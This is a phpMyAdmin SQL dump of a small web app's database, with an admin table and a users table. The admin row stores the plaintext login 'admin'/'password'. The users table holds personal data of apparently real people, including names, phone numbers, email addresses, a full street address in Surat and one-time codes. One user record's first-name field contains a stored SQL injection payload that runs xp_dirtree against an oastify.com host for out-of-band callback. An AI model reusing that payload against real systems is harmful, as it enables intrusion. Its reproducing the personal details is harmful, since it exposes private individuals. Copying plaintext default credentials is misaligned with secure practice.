-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Sep 06, 2024 at 12:38 PM
-- Server version: 8.0.39
-- PHP Version: 8.3.9

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `theworld_book`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int NOT NULL,
  `a_username` varchar(100) NOT NULL,
  `a_password` varchar(100) NOT NULL,
  `a_type` text NOT NULL,
  `a_status` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `a_username`, `a_password`, `a_type`, `a_status`) VALUES
(1, 'admin', 'password', 'admin', 'Enable');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int NOT NULL,
  `firstname` text,
  `lastname` text,
  `profile_photo` text,
  `username` varchar(1024) DEFAULT NULL,
  `address` text,
  `address2` text,
  `address3` text,
  `city` text,
  `state` text,
  `pincode` text,
  `country` text,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  `otp` text
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `firstname`, `lastname`, `profile_photo`, `username`, `address`, `address2`, `address3`, `city`, `state`, `pincode`, `country`, `created_at`, `otp`) VALUES
(11, 'Dishant', 'Mehta', NULL, '7600015802', '', NULL, NULL, '', '', '', '', '2021-07-16 16:48:01', ''),
(12, NULL, NULL, NULL, '9426667678', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2021-07-16 17:29:16', ''),
(13, 'Ghanshyam', 'Kheni', NULL, '919426667678', '', NULL, NULL, '', '', '', '', '2021-07-16 17:29:59', ''),
(14, 'Ghanshyam', 'Kheni', NULL, 'shyamkheni@gmail.com', 'D - 404, Paradise Residency', 'Near - The Palladium Mall, Yogi Chowk', '', 'Surat', 'Gujarat', '395010', 'India', '2021-07-16 17:40:29', ''),
(15, NULL, NULL, NULL, 'dishant.1712@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2021-07-18 10:16:39', 'pOPdulZ'),
(16, NULL, NULL, NULL, '7405364794', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2021-07-19 12:09:21', ''),
(17, NULL, NULL, NULL, '917405364794', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2021-07-19 13:36:28', ''),
(18, NULL, NULL, NULL, 'itdesk@hindva.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2021-07-20 13:20:46', 'Ae4b8Jx'),
(19, 'Soham', 'Pandya', NULL, '+917405364794', 'SURAT\r\nINDIA', NULL, NULL, 'SURAT', 'Gujarat', '395006', 'India', '2021-07-21 13:26:32', ''),
(20, 'Soham1', 'Pandya1', NULL, 'soham.pandya@easternts.com', 'SURAT\r\nINDIA', NULL, NULL, 'SURAT', 'Gujarat', '395006', 'India', '2021-07-21 13:34:41', ''),
(21, NULL, NULL, NULL, '+919924189636', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2021-07-21 13:36:51', ''),
(22, NULL, NULL, NULL, '+918469510048', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2021-07-21 13:40:10', ''),
(23, NULL, NULL, NULL, '41424', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2021-07-22 08:37:32', ''),
(24, 'Azalia', 'Nielsen', NULL, '+917600015802', 'Culpa ad impedit s', 'Exercitationem illo ', 'Sed error voluptas i', 'Magni inventore dolo', 'Anim non amet tempo', 'Odit non quisquam au', 'Lorem et quaerat qua', '2021-07-22 08:48:08', ''),
(25, 'Ghanshyam', 'Kheni', NULL, '+919426667678', 'D - 404, Paradise Residency\r\nNear - The Palladium Mall, Yogi Chowk', NULL, NULL, 'Surat', 'Gujarat', '395010', 'India', '2021-07-22 10:29:44', ''),
(26, 'Anil', 'Radadiya', NULL, '+918000562592', '', NULL, NULL, '', '', '', '', '2021-07-26 12:46:17', ''),
(27, NULL, NULL, NULL, 'keyurkheni@hotmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2021-07-27 07:34:57', 'HscoAXY'),
(28, 'Keyur', 'Kheni', NULL, '+919825600339', '73, Sadhna Society\r\nVarachha Road', NULL, NULL, 'Surat', 'Gujarat ', '395006', 'India', '2021-07-27 07:35:18', ''),
(29, 'test', 'testagain', NULL, '+919510856263', '', '', '', '', '', '', '', '2021-07-27 13:28:54', ''),
(30, NULL, NULL, NULL, '+919876543210', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2021-07-27 13:53:50', ''),
(31, 'Mayank', 'Patel ', NULL, '+919879166691', '', '', '', '', '', '', '', '2021-08-04 08:09:58', ''),
(32, 'devang', 'test', NULL, '+917567135981', '', '', '', '', '', '', '', '2021-08-06 07:06:08', ''),
(33, 'Prachi', 'Patel', NULL, '+919081257530', '', '', '', '', '', '', '', '2021-08-06 12:39:00', ''),
(34, 'Test', 'Test', NULL, '+917573893675', '', '', '', '', '', '', '', '2021-08-12 19:51:13', ''),
(35, NULL, NULL, NULL, '+918866545450', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-22 14:18:18', ''),
(36, NULL, NULL, NULL, 'webmaster@yopmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-22 14:18:26', 'mNC6MhZ'),
(37, NULL, NULL, NULL, '+919999999999', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2023-02-02 11:38:04', ''),
(38, NULL, NULL, NULL, '+919999999990', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2023-02-02 11:38:23', ''),
(39, 'USER\';declare @q varchar(99);set @q=\'\\\\5msef5jk4s3h62zzs4bazfcbd2jv7lvcm0en4bt.oasti\'+\'fy.com\\ljf\'; exec master.dbo.xp_dirtree @q;-- ', 'Cyfi', NULL, 'sihic27934@bymercy.com', 'ASD', '', '', 'ASD', 'GUJ', '999999', 'IN', '2023-02-02 11:45:27', ''),
(40, NULL, NULL, NULL, 'jagruti.easternts@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2023-08-17 14:03:31', 'ibo41S8');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `mobile_number` (`username`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=41;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
